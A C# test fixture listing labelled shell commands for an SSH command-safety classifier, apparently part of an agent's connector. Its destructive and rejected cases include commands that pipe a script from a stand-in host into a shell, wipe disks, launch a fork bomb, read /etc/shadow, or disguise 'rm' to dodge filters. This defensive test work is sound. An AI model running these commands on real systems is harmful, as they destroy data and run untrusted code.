namespace Test.Shared.Connectors.Ssh
{
    using System.Collections.Generic;
    using Hugo.Connectors.Ssh.Classification;

    /// <summary>
    /// The SSH command classifier table (P4.5 acceptance: at least 150 cases).
    /// </summary>
    public static class SshClassifierTable
    {
        /// <summary>
        /// All rows.
        /// </summary>
        /// <returns>Rows.</returns>
        public static List<SshClassifierCase> Cases()
        {
            SshClassifierOptions sudo = new SshClassifierOptions { AllowSudo = true };
            SshClassifierOptions deny = new SshClassifierOptions { DeniedPatterns = new List<string> { @"\brm\b", "curl" } };
            SshClassifierOptions readOnly = new SshClassifierOptions { ReadOnlyPatterns = new List<string> { "myapp status( .*)?", @"/opt/tools/report\.sh.*", "rm .*" } };
            SshClassifierOptions destructive = new SshClassifierOptions { DestructivePatterns = new List<string> { "^myapp purge" } };

            List<SshClassifierCase> c = new List<SshClassifierCase>();

            // Read
            c.Add(new SshClassifierCase("ls -la /var/log", "R"));
            c.Add(new SshClassifierCase("cat /etc/os-release", "R"));
            c.Add(new SshClassifierCase("df -h", "R"));
            c.Add(new SshClassifierCase("du -sh /var/*", "R"));
            c.Add(new SshClassifierCase("free -m", "R"));
            c.Add(new SshClassifierCase("uptime", "R"));
            c.Add(new SshClassifierCase("ps aux", "R"));
            c.Add(new SshClassifierCase("ps -eo pid,comm --sort=-pcpu | head -n 5", "R"));
            c.Add(new SshClassifierCase("top -b -n 1", "R"));
            c.Add(new SshClassifierCase("journalctl -u nginx -n 100 --no-pager", "R"));
            c.Add(new SshClassifierCase("systemctl status nginx", "R"));
            c.Add(new SshClassifierCase("systemctl --no-pager status nginx.service", "R"));
            c.Add(new SshClassifierCase("systemctl list-units --failed", "R"));
            c.Add(new SshClassifierCase("systemctl is-active sshd", "R"));
            c.Add(new SshClassifierCase("systemctl", "R"));
            c.Add(new SshClassifierCase("service nginx status", "R"));
            c.Add(new SshClassifierCase("ss -tlnp", "R"));
            c.Add(new SshClassifierCase("netstat -an", "R"));
            c.Add(new SshClassifierCase("docker ps -a", "R"));
            c.Add(new SshClassifierCase("docker logs --tail 100 web", "R"));
            c.Add(new SshClassifierCase("docker container ls", "R"));
            c.Add(new SshClassifierCase("docker inspect web", "R"));
            c.Add(new SshClassifierCase("docker compose ps", "R"));
            c.Add(new SshClassifierCase("kubectl get pods -n shop", "R"));
            c.Add(new SshClassifierCase("kubectl -n shop describe pod web-1", "R"));
            c.Add(new SshClassifierCase("kubectl logs deploy/web --tail=50", "R"));
            c.Add(new SshClassifierCase("helm list -A", "R"));
            c.Add(new SshClassifierCase("grep -m 50 ERROR /var/log/syslog", "R"));
            c.Add(new SshClassifierCase("tail -n 200 /var/log/nginx/error.log", "R"));
            c.Add(new SshClassifierCase("head -n 20 /etc/passwd", "R"));
            c.Add(new SshClassifierCase("cat /var/log/app.log | grep ERROR | sort | uniq -c | sort -rn | head", "R"));
            c.Add(new SshClassifierCase("find /var/log -name '*.log' -mtime -1", "R"));
            c.Add(new SshClassifierCase("find / -xdev -size +100M 2>/dev/null", "R"));
            c.Add(new SshClassifierCase("ls -la > /dev/null 2>&1", "R"));
            c.Add(new SshClassifierCase("echo hello", "R"));
            c.Add(new SshClassifierCase("uname -a && hostname", "R"));
            c.Add(new SshClassifierCase("id; whoami; groups", "R"));
            c.Add(new SshClassifierCase("dmesg | tail -n 50", "R"));
            c.Add(new SshClassifierCase("wc -l /var/log/syslog", "R"));
            c.Add(new SshClassifierCase("stat /etc/hosts", "R"));
            c.Add(new SshClassifierCase("ip addr show", "R"));
            c.Add(new SshClassifierCase("ip -br a", "R"));
            c.Add(new SshClassifierCase("ip route", "R"));
            c.Add(new SshClassifierCase("lsblk", "R"));
            c.Add(new SshClassifierCase("env", "R"));
            c.Add(new SshClassifierCase("printenv PATH", "R"));
            c.Add(new SshClassifierCase("date", "R"));
            c.Add(new SshClassifierCase("date +%s", "R"));
            c.Add(new SshClassifierCase("hostname", "R"));
            c.Add(new SshClassifierCase("sed -n '1,20p' /etc/nginx/nginx.conf", "R"));
            c.Add(new SshClassifierCase("awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c", "R"));
            c.Add(new SshClassifierCase("awk -F: '$3 > 999 {print $1}' /etc/passwd", "R"));
            c.Add(new SshClassifierCase("curl -s http://127.0.0.1:8080/health", "R"));
            c.Add(new SshClassifierCase("curl -sS -o /dev/null -w '%{http_code}' http://127.0.0.1/", "R"));
            c.Add(new SshClassifierCase("wget -qO- http://127.0.0.1/health", "R"));
            c.Add(new SshClassifierCase("git status", "R"));
            c.Add(new SshClassifierCase("git log --oneline -n 10", "R"));
            c.Add(new SshClassifierCase("git -C /srv/app diff HEAD~1", "R"));
            c.Add(new SshClassifierCase("dpkg -l | grep nginx", "R"));
            c.Add(new SshClassifierCase("rpm -qa | grep kernel", "R"));
            c.Add(new SshClassifierCase("apt list --installed", "R"));
            c.Add(new SshClassifierCase("apt-cache policy nginx", "R"));
            c.Add(new SshClassifierCase("pip list", "R"));
            c.Add(new SshClassifierCase("crontab -l", "R"));
            c.Add(new SshClassifierCase("iptables -L -n", "R"));
            c.Add(new SshClassifierCase("iptables -nvL", "R"));
            c.Add(new SshClassifierCase("sysctl net.ipv4.ip_forward", "R"));
            c.Add(new SshClassifierCase("mount", "R"));
            c.Add(new SshClassifierCase("echo $(date)", "R"));
            c.Add(new SshClassifierCase("echo \"uptime: $(uptime)\"", "R"));
            c.Add(new SshClassifierCase("for f in /var/log/*.log; do wc -l \"$f\"; done", "R"));
            c.Add(new SshClassifierCase("if [ -f /etc/nginx/nginx.conf ]; then echo yes; fi", "R"));
            c.Add(new SshClassifierCase("LANG=C ls", "R"));
            c.Add(new SshClassifierCase("timeout 5 ping -c 3 10.0.0.1", "R"));
            c.Add(new SshClassifierCase("nice -n 10 du -sh /srv", "R"));
            c.Add(new SshClassifierCase("xargs -n1 echo < /tmp/list", "R"));
            c.Add(new SshClassifierCase("watch -n 1 'df -h'", "R"));
            c.Add(new SshClassifierCase("bash -c 'ls -la /tmp'", "R"));
            c.Add(new SshClassifierCase("sh -c \"cat /etc/hostname\"", "R"));
            c.Add(new SshClassifierCase("tar -tzf backup.tgz", "R"));
            c.Add(new SshClassifierCase("openssl x509 -in /etc/ssl/cert.pem -noout -dates", "R"));
            c.Add(new SshClassifierCase("kill -0 1234", "R"));
            c.Add(new SshClassifierCase("kill -l", "R"));
            c.Add(new SshClassifierCase("# just a comment", "R"));
            c.Add(new SshClassifierCase("ls -la /tmp # list it", "R"));
            c.Add(new SshClassifierCase("zcat /var/log/syslog.2.gz | grep -c error", "R"));
            c.Add(new SshClassifierCase("cut -d: -f1 /etc/passwd | sort", "R"));
            c.Add(new SshClassifierCase("ls 2>/dev/null || echo none", "R"));
            c.Add(new SshClassifierCase("test -d /srv && ls /srv", "R"));
            c.Add(new SshClassifierCase("lsof -i :443", "R"));
            c.Add(new SshClassifierCase("command -v nginx", "R"));
            c.Add(new SshClassifierCase("nproc; cat /proc/loadavg", "R"));
            c.Add(new SshClassifierCase("{ ls; pwd; }", "R"));
            c.Add(new SshClassifierCase("(cd /var/log && ls)", "R"));
            c.Add(new SshClassifierCase("! grep -q foo /etc/hosts", "R"));
            c.Add(new SshClassifierCase("cat <<< 'hello'", "R"));
            c.Add(new SshClassifierCase("diff <(sort a.txt) <(sort b.txt)", "R"));
            c.Add(new SshClassifierCase("echo `hostname`", "R"));
            c.Add(new SshClassifierCase("export FOO=bar; echo $FOO", "R"));
            c.Add(new SshClassifierCase("zfs list", "R"));
            c.Add(new SshClassifierCase("echo \"a;b|c && d\"", "R"));
            c.Add(new SshClassifierCase("grep 'rm -rf' /var/log/audit.log", "R"));

            // Write
            c.Add(new SshClassifierCase("touch /tmp/marker", "W"));
            c.Add(new SshClassifierCase("mkdir -p /tmp/hugo", "W"));
            c.Add(new SshClassifierCase("cp /etc/hosts /tmp/hosts.bak", "W"));
            c.Add(new SshClassifierCase("mv /tmp/a /tmp/b", "W"));
            c.Add(new SshClassifierCase("chmod 644 /tmp/file", "W"));
            c.Add(new SshClassifierCase("echo hello >> /tmp/log.txt", "W"));
            c.Add(new SshClassifierCase("systemctl start nginx", "W"));
            c.Add(new SshClassifierCase("systemctl reload nginx", "W"));
            c.Add(new SshClassifierCase("systemctl daemon-reload", "W"));
            c.Add(new SshClassifierCase("service nginx start", "W"));
            c.Add(new SshClassifierCase("apt-get install -y htop", "W"));
            c.Add(new SshClassifierCase("apt update", "W"));
            c.Add(new SshClassifierCase("docker restart web", "W"));
            c.Add(new SshClassifierCase("docker pull nginx:1.27", "W"));
            c.Add(new SshClassifierCase("docker run --rm alpine echo hi", "W"));
            c.Add(new SshClassifierCase("kubectl apply -f deploy.yaml", "W"));
            c.Add(new SshClassifierCase("kubectl scale deploy/web --replicas=3", "W"));
            c.Add(new SshClassifierCase("kubectl rollout restart deploy/web", "W"));
            c.Add(new SshClassifierCase("git pull", "W"));
            c.Add(new SshClassifierCase("git commit -am fix", "W"));
            c.Add(new SshClassifierCase("curl -X POST http://127.0.0.1/api/reload", "W"));
            c.Add(new SshClassifierCase("curl -d 'a=1' http://127.0.0.1/", "W"));
            c.Add(new SshClassifierCase("curl -o /tmp/file http://example.com/file", "W"));
            c.Add(new SshClassifierCase("wget http://example.com/file.tgz", "W"));
            c.Add(new SshClassifierCase("python3 script.py", "W"));
            c.Add(new SshClassifierCase("./deploy.sh", "W"));
            c.Add(new SshClassifierCase("bash /opt/scripts/rotate.sh", "W"));
            c.Add(new SshClassifierCase("make build", "W"));
            c.Add(new SshClassifierCase("ls | tee -a /tmp/log.txt", "W"));
            c.Add(new SshClassifierCase("sysctl -w net.ipv4.ip_forward=1", "W"));
            c.Add(new SshClassifierCase("hostname newname", "W"));
            c.Add(new SshClassifierCase("crontab -e", "W"));
            c.Add(new SshClassifierCase("tar -czf /tmp/backup.tgz /etc", "W"));
            c.Add(new SshClassifierCase("gzip /var/log/old.log", "W"));
            c.Add(new SshClassifierCase("sort -o /tmp/sorted.txt input.txt", "W"));
            c.Add(new SshClassifierCase("ln -s /etc/nginx/sites-available/a /etc/nginx/sites-enabled/a", "W"));
            c.Add(new SshClassifierCase("find /tmp -name '*.tmp' -fprint /tmp/list", "W"));
            c.Add(new SshClassifierCase("sed -n 'w /tmp/out' input.txt", "W"));
            c.Add(new SshClassifierCase("awk '{print > \"/tmp/out\"}' in.txt", "W"));
            c.Add(new SshClassifierCase("awk 'BEGIN { system(\"id\") }'", "W"));
            c.Add(new SshClassifierCase("ls | xargs touch", "W"));
            c.Add(new SshClassifierCase("ip link set eth0 mtu 9000", "W"));
            c.Add(new SshClassifierCase("iptables -A INPUT -p tcp --dport 22 -j ACCEPT", "W"));
            c.Add(new SshClassifierCase("nohup ./server &", "W"));
            c.Add(new SshClassifierCase("source ~/.bashrc", "W"));
            c.Add(new SshClassifierCase("npm install", "W"));
            c.Add(new SshClassifierCase("useradd bob", "W"));
            c.Add(new SshClassifierCase("unknowncommand --flag", "W"));
            c.Add(new SshClassifierCase("ssh other-host uptime", "W"));
            c.Add(new SshClassifierCase("pip install requests", "W"));
            c.Add(new SshClassifierCase("~/bin/report", "W"));
            c.Add(new SshClassifierCase("date -s '2026-01-01 00:00:00'", "W"));

            // Destructive
            c.Add(new SshClassifierCase("rm -rf /tmp/hugo", "D"));
            c.Add(new SshClassifierCase("rm /var/log/old.log", "D"));
            c.Add(new SshClassifierCase("/bin/rm -f /tmp/x", "D"));
            c.Add(new SshClassifierCase("\\rm -f /tmp/x", "D"));
            c.Add(new SshClassifierCase("r'm' -rf /", "D"));
            c.Add(new SshClassifierCase("\"rm\" -rf /", "D"));
            c.Add(new SshClassifierCase("ls && rm -rf /tmp/x", "D"));
            c.Add(new SshClassifierCase("ls; reboot", "D"));
            c.Add(new SshClassifierCase("ls\nreboot", "D"));
            c.Add(new SshClassifierCase("ls || shutdown -h now", "D"));
            c.Add(new SshClassifierCase("shutdown -h now", "D"));
            c.Add(new SshClassifierCase("reboot", "D"));
            c.Add(new SshClassifierCase("kill -9 1234", "D"));
            c.Add(new SshClassifierCase("pkill nginx", "D"));
            c.Add(new SshClassifierCase("killall -HUP nginx", "D"));
            c.Add(new SshClassifierCase("dd if=/dev/zero of=/dev/sda bs=1M", "D"));
            c.Add(new SshClassifierCase("mkfs.ext4 /dev/sdb1", "D"));
            c.Add(new SshClassifierCase("systemctl stop nginx", "D"));
            c.Add(new SshClassifierCase("systemctl restart nginx", "D"));
            c.Add(new SshClassifierCase("systemctl disable nginx", "D"));
            c.Add(new SshClassifierCase("service nginx restart", "D"));
            c.Add(new SshClassifierCase("docker rm -f web", "D"));
            c.Add(new SshClassifierCase("docker system prune -af", "D"));
            c.Add(new SshClassifierCase("docker exec -it web sh", "D"));
            c.Add(new SshClassifierCase("docker compose down", "D"));
            c.Add(new SshClassifierCase("kubectl delete pod web-1", "D"));
            c.Add(new SshClassifierCase("kubectl -n shop exec web-1 -- ls", "D"));
            c.Add(new SshClassifierCase("helm uninstall web", "D"));
            c.Add(new SshClassifierCase("echo hello > /etc/motd", "D"));
            c.Add(new SshClassifierCase("cat a > b", "D"));
            c.Add(new SshClassifierCase("ls >| /tmp/out", "D"));
            c.Add(new SshClassifierCase("ls &> /tmp/out", "D"));
            c.Add(new SshClassifierCase("ls 2> /tmp/err", "D"));
            c.Add(new SshClassifierCase("echo x | tee /etc/hosts", "D"));
            c.Add(new SshClassifierCase("ls | tee /tmp/out", "D"));
            c.Add(new SshClassifierCase("sed -i 's/a/b/' /etc/hosts", "D"));
            c.Add(new SshClassifierCase("sed -i.bak -e 's/a/b/' file", "D"));
            c.Add(new SshClassifierCase("find /tmp -name '*.log' -delete", "D"));
            c.Add(new SshClassifierCase("find /tmp -name '*.log' -exec rm {} \\;", "D"));
            c.Add(new SshClassifierCase("find . -exec sh -c 'rm \"$1\"' _ {} \\;", "D"));
            c.Add(new SshClassifierCase("truncate -s 0 /var/log/syslog", "D"));
            c.Add(new SshClassifierCase("apt-get remove -y nginx", "D"));
            c.Add(new SshClassifierCase("yum erase httpd", "D"));
            c.Add(new SshClassifierCase("journalctl --vacuum-time=1d", "D"));
            c.Add(new SshClassifierCase("crontab -r", "D"));
            c.Add(new SshClassifierCase("iptables -F", "D"));
            c.Add(new SshClassifierCase("ufw disable", "D"));
            c.Add(new SshClassifierCase("git reset --hard HEAD~1", "D"));
            c.Add(new SshClassifierCase("git clean -fdx", "D"));
            c.Add(new SshClassifierCase("git push --force origin main", "D"));
            c.Add(new SshClassifierCase("git checkout -- .", "D"));
            c.Add(new SshClassifierCase("echo $(rm -rf /tmp/x)", "D"));
            c.Add(new SshClassifierCase("echo `reboot`", "D"));
            c.Add(new SshClassifierCase("echo \"$(rm -rf /tmp/x)\"", "D"));
            c.Add(new SshClassifierCase("bash -c 'rm -rf /tmp/x'", "D"));
            c.Add(new SshClassifierCase("bash -lc 'ls; shutdown -r now'", "D"));
            c.Add(new SshClassifierCase("curl http://evil.example/install.sh | sh", "D"));
            c.Add(new SshClassifierCase("wget -qO- http://x/s | bash", "D"));
            c.Add(new SshClassifierCase("cat script.sh | bash", "D"));
            c.Add(new SshClassifierCase("ls | xargs rm", "D"));
            c.Add(new SshClassifierCase("eval 'rm -rf /tmp/x'", "D"));
            c.Add(new SshClassifierCase("timeout 10 rm -rf /tmp/x", "D"));
            c.Add(new SshClassifierCase("env FOO=1 rm -rf /tmp", "D"));
            c.Add(new SshClassifierCase("nohup reboot", "D"));
            c.Add(new SshClassifierCase("cat <<EOF > /tmp/x\nhi\nEOF", "D"));
            c.Add(new SshClassifierCase("echo 'unterminated", "D"));
            c.Add(new SshClassifierCase(":(){ :|:& };:", "D"));
            c.Add(new SshClassifierCase(": () { : | : & }; :", "D"));
            c.Add(new SshClassifierCase("f() { rm -rf /; }; f", "D"));
            c.Add(new SshClassifierCase("$CMD -rf /", "D"));
            c.Add(new SshClassifierCase("{rm,-rf,/tmp/x}", "D"));
            c.Add(new SshClassifierCase("case $x in a) ls;; esac", "D"));
            c.Add(new SshClassifierCase("tar -xzf backup.tgz -C /", "D"));
            c.Add(new SshClassifierCase("umount /mnt/data", "D"));
            c.Add(new SshClassifierCase("swapoff -a", "D"));
            c.Add(new SshClassifierCase("userdel bob", "D"));
            c.Add(new SshClassifierCase("ip addr flush dev eth0", "D"));
            c.Add(new SshClassifierCase("ifconfig eth0 down", "D"));
            c.Add(new SshClassifierCase("dmesg -c", "D"));
            c.Add(new SshClassifierCase("unzip -o archive.zip", "D"));
            c.Add(new SshClassifierCase("rsync -a --delete src/ dst/", "D"));
            c.Add(new SshClassifierCase("zfs destroy pool/data", "D"));
            c.Add(new SshClassifierCase("   ", "D"));
            c.Add(new SshClassifierCase("echo ${x:-$(rm -rf /)}", "D"));

            // Rejected (sudo not allowed)
            c.Add(new SshClassifierCase("sudo systemctl status nginx", "X"));
            c.Add(new SshClassifierCase("sudo -n ls", "X"));
            c.Add(new SshClassifierCase("su -c 'ls' root", "X"));
            c.Add(new SshClassifierCase("doas reboot", "X"));
            c.Add(new SshClassifierCase("ls && sudo rm -rf /", "X"));
            c.Add(new SshClassifierCase("echo $(sudo cat /etc/shadow)", "X"));
            c.Add(new SshClassifierCase("bash -c 'sudo ls'", "X"));
            c.Add(new SshClassifierCase("/usr/bin/sudo id", "X"));

            // sudo allowed
            c.Add(new SshClassifierCase("sudo -n systemctl status nginx", "R", sudo));
            c.Add(new SshClassifierCase("sudo -n journalctl -u nginx -n 50", "R", sudo));
            c.Add(new SshClassifierCase("sudo -u postgres psql -c 'select 1'", "W", sudo));
            c.Add(new SshClassifierCase("sudo rm -rf /tmp/x", "D", sudo));
            c.Add(new SshClassifierCase("sudo -i", "D", sudo));
            c.Add(new SshClassifierCase("sudo -l", "R", sudo));
            c.Add(new SshClassifierCase("su -c 'systemctl restart nginx'", "D", sudo));
            c.Add(new SshClassifierCase("sudo -n tee /etc/motd", "D", sudo));
            c.Add(new SshClassifierCase("sudo -n systemctl reload nginx", "W", sudo));

            // Denied patterns
            c.Add(new SshClassifierCase("rm -rf /tmp/x", "X", deny));
            c.Add(new SshClassifierCase("ls; r\\m -rf /", "X", deny));
            c.Add(new SshClassifierCase("curl -s http://x", "X", deny));
            c.Add(new SshClassifierCase("ls -la", "R", deny));

            // Resource read-only and destructive patterns
            c.Add(new SshClassifierCase("myapp status --verbose", "R", readOnly));
            c.Add(new SshClassifierCase("myapp restart", "W", readOnly));
            c.Add(new SshClassifierCase("/opt/tools/report.sh --daily", "R", readOnly));
            c.Add(new SshClassifierCase("myapp status; rm -rf /", "D", readOnly));
            c.Add(new SshClassifierCase("rm -rf /tmp", "D", readOnly));
            c.Add(new SshClassifierCase("myapp purge --all", "D", destructive));
            c.Add(new SshClassifierCase("myapp list", "W", destructive));
            return c;
        }
    }
}
